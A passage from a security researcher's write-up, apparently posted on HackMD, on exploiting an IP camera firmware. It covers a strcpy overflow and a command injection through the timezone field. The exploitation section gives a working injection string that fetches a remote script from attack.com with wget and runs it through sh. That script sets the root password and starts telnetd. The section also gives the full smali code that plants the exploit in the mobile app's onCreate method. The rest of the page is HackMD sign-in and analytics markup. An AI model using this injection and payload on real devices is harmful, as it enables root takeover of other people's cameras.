In this function, we can see two vulnerabilities. First, the `strcpy` allows us to copy more than 40 bytes into `acStack64`. One may argue that a length check occurred outside of this function, but I verified it experimentally and it indeed crashed the binary.

Second, we can command-inject our way into the system! We just need our input to start with a valid locale filename (`UTC+01_00`, etc) in order for the binary to reach this function (I also verified this experimentally). I could not find the parent calling function, but it may be that the developer used a `strncmp` and only verified the first couple bytes of input to match a valid locale filename.


## Exploitation
I decided to exploit the command injection. Using APKtool, I dumped the mIPC mobile application and reverse engineered the behavior that sets timezones.

I first instantiated a `mcld_ctx_time_set` object. The definition for it:
```
.class public Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;
.super Lcom/mining/cloud/bean/mcld/mcld_ctx;
.source &#34;mcld_ctx_time_set.java&#34;


# instance fields
.field public auto_sync:I

.field public day:I

.field public hour:I

.field public min:I

.field public mon:I

.field public ntp_addr:Ljava/lang/String;

.field public sec:I

.field public timezone:Ljava/lang/String;

.field public type:Ljava/lang/String;

.field public year:I


# direct methods
.method public constructor &lt;init&gt;()V
    .locals 0

    .line 6
    invoke-direct {p0}, Lcom/mining/cloud/bean/mcld/mcld_ctx;-&gt;&lt;init&gt;()V

    return-void
.end method
```

The locale filename (`param_2`) is expected in the `timezone` field. Because of the buffer overflow, we are constrainted to &lt; 40 characters in this injection, including the bytes at the beginning for a valid locale filename. Otherwise, we will crash the mIPC binary.

To circumvent this, I decided to host my actual payload on a remote server, and execute it by calling `wget` and piping the output into `sh`. This gives me unlimited access to the shell.

I set:
- type == `NTP`
- timezone == `UTC+01_00;wget -qO- attack.com|sh #`
- auto_sync = 1
- sn == a serial number I got from calling `McldActivityLivePlay-&gt;mSerialNumber`
- handler == `McldActivityLivePlay-&gt;customTimeSetHandler`

I then invoked `mcld_agent-&gt;time_set` with this object and a couple other retrieved configurations to set the locale. See [here](#Full-payload) for the full thing. 

My remote payload just consisted of changing the root password with `echo &#34;root:root&#34; | chpasswd` and starting telnetd. Recall that the root password is randomized on startup.

To make it easier for my coworker, Chris, to collect data (we were remote), I embedded my exploit into the `onCreate` method of the `McIdActivityLivePlay` class. This meant as soon as someone views the camera, the attack is run.

I re-compiled the application with apktool, signed it, and installed it via ADB.

![](https://i.imgur.com/fBdlPHf.png)


## Full payload
I learned way too much about Dalvik.

```
    new-instance v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;

    invoke-direct {v1}, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;&lt;init&gt;()V



    const-string v2, &#34;NTP&#34;



    iput-object v2, v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;type:Ljava/lang/String;






    const-string v2, &#34;UTC+01_00;wget -qO- attack.com|sh #&#34;


    iput-object v2, v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;timezone:Ljava/lang/String;


    const/4 v2, 0x1
    
    
    iput v2, v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;auto_sync:I







    iget-object v2, p0, Lcom/mining/cloud/activity/McldActivityLivePlay;-&gt;mSerialNumber:Ljava/lang/String;


    iput-object v2, v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;sn:Ljava/lang/String;




    iget-object v2, p0, Lcom/mining/cloud/activity/McldActivityLivePlay;-&gt;customTimeSetHandler:Landroid/os/Handler;

    iput-object v2, v1, Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;-&gt;handler:Landroid/os/Handler;







    iget-object v3, p0, Lcom/mining/cloud/activity/McldActivityLivePlay;-&gt;mApp:Lcom/mining/cloud/application/McldApp;

    iget-object v3, v3, Lcom/mining/cloud/application/McldApp;-&gt;mAgent:Lcom/mining/cloud/mcld_agent;

    invoke-virtual {v3, v1}, Lcom/mining/cloud/mcld_agent;-&gt;time_set(Lcom/mining/cloud/bean/mcld/mcld_ctx_time_set;)V
```</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="rHJM6x9e-Sxt6tF0v4fT-hB7_wq1n491YLpE"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c"></script>
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="bg-white btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="a41a463c-6ec7-4fc3-a8a5-41fdc8e6693c">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="https://hackmd.io/api/i18n.js"></script>
     <script src="https://assets.hackmd.io/build/font-vendor.eaa8dd82d4e056021b8c.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.04da453a2a68f624f4d4.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.94ca39727118897623cd.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.e537850a918313f6b528.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.36262738c64c2bfb958b.js" defer="defer"></script>

    

</body>
</html>
